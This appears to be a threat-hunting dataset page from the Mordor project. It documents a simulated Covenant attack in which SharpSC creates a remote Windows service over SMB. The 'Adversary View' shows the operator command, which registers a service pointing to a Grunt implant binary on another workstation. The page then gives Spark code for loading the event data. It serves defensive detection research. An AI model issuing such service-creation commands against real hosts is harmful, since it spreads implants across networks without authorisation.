# Covenant Service Creation with CreateServiceA

## Metadata


|                       |    |
|:----------------------|:---|
| id                    | SDWIN-200806022635 |
| author                | Roberto Rodriguez @Cyb3rWard0g |
| creation date         | 2020/08/06 |
| platform              | Windows |
| Simulaton Environment | Mordor shire |
| Simulation Scripts    | [] |
| Dataset           | https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/covenant_sharpsc_dcerpc_smb_svcctl_CreateServiceA.zip |
| References        | None |

## Dataset Description
This dataset represents a threat actor with network access to the service control manager (SCM) service over SMB of another enpoint in the network executing the CreateServiceA method to create services.

## Adversary View
```
(wardog) > SharpSC /command:"action=create computername=WORKSTATION6 service=Cyb3rWard0g displayname=OTR binpath=C:\Windows\System32\GruntHTTP2.exe"

[-] Error uninstalling Cyb3rWard0g on WORKSTATION6. Reason: ServiceHandle is invalid.

[*] Attempting to create service Cyb3rWard0g on WORKSTATION6...

[*] Created Cyb3rWard0g Service on WORKSTATION6
```

## Explore Mordor Dataset

### Initialize Analytics Engine

from openhunt.mordorutils import *
spark = get_spark()

### Download & Process Mordor File

mordor_file = "https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/covenant_sharpsc_dcerpc_smb_svcctl_CreateServiceA.zip"
registerMordorSQLTable(spark, mordor_file, "mordorTable")

### Get to know your data

df = spark.sql(
    '''
SELECT *
FROM mordorTable
    '''
)
df.printSchema()
        